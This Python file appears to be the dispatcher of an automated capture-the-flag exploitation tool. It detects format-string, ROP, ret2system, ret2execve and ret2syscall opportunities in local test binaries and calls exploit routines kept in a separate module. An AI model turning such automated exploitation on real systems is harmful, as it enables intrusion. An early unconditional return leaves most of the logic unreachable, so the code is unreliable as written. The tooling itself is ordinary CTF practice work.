import time
import json

from dynamic import Dynamic
from static import Static
from exploits import Exploits

# this is the function that will detect what exploit to use and call it 
def handle_exploits(binary):
    e = Exploits(binary)
    d = Dynamic()
    s = Static()

    printf = d.detect_printf_vuln(binary)
    win = False
    libc_leak = None
    syscall = None
    constrained_win = False

    if True:
        e.rop_parameters(binary)
        return
    
    if printf == "array":
        print("[*] Array abuse detected.")

        flag = e.arrayabuse(binary)

        if not flag:
            pass

        return flag.decode()

    # printf vulns -- read/write/got overwrite
    if printf == "printf":
        # printf read
        print("[*] printf read")

        flag = e.printf_read_var(binary)

        if not flag:
            # angr??
            pass

        return flag.decode()
    
    elif printf == "libc":
        # libc leak -- ret2one
        print("[*] ret2one detected.")
        
        vuln = json.loads(e.pipe.cmd("pdfj @ sym.vuln"))
        libc_leak = s.find_given_leaks(vuln)
        
        flag = e.ret2one(binary, libc_leak)

        if not flag:
            print("[*] Running without a ret")

            flag = e.ret2one(binary, libc_leak, False)

            if not flag:
                # angr!!
                pass

        return flag.decode()

    # check for "win" in pwnelf.sym -- ret2win/rop params
    if "win" in e.pwnelf.sym.keys():
        win = True
        #e.ret2win(binary)

    if "constrained_win" in e.pwnelf.sym.keys():
        constrained_win = True
        # e.rop_parameters(binary)

    # check for "execve" in pwnelf.plt -- ret2execve
    if "execve" in e.pwnelf.plt.keys():
        print("[*] ret2execve detected.")
        
        flag = e.ret2execve(binary)

        if not flag:
            # angr!!
            pass

        return flag.decode()

    # check for "system" in pwnelf.plt -- ret2system 
    if "system" in e.pwnelf.plt.keys():
        print("[*] ret2system detected.")

        flag = e.ret2system(binary)

        if not flag:
            # run without ret and then angr!!
            print("[*] Running without a ret")

            flag = e.ret2system(binary)

            if not flag:
                # angr!!
                pass

        return flag.decode()

    # array abuse -- order subject to change


    # syscall gadget -- ret2syscall 
    for file, gadget in e.rs.search(search="syscall"):
        if "syscall;" in str(gadget):
            syscall = int(str(gadget).split(":")[0], 16)
            break

    if syscall:
        print("[*] ret2syscall detected.")

        flag = e.ret2syscall(binary, syscall)

        if not flag:
            print("[*] Shortening ROP chain 1.")

            flag = e.ret2syscall(binary, syscall, 1)

        if not flag:
            print("[*] Shortening ROP chain 2.")

            flag = e.ret2syscall(binary, syscall, 2)

        if not flag:
            print("[*] Shortening ROP chain 3.")

            flag = e.ret2syscall(binary, syscall, 3)

        if not flag:
            # angr!!
            pass

        return flag.decode()

    # write gadget -- write gadgets -- order subject to change



#if __name__ == "__main__":
'''
# testing grounds
bins = [ f"./ace-student/test-bins/bin-printf-read-var-{i}" for i in range(10) ]
count = 0
start = time.time()
flags = []

for binary in bins:
    print("========== " + binary)
    flag = handle_exploits(binary)
    flags.append(flag)

    if flag == "flag{your_mom_is_very_beautiful_to_me}":
        count += 1

end = time.time()
print(f"==== Test conclusion: {count}/10 in {end - start} seconds. ====")
#print(flags)
'''
flag = handle_exploits("./ace-student/test-bins/bin-rop-parameters-0")
#print(flag)
#e = App(argv[1])

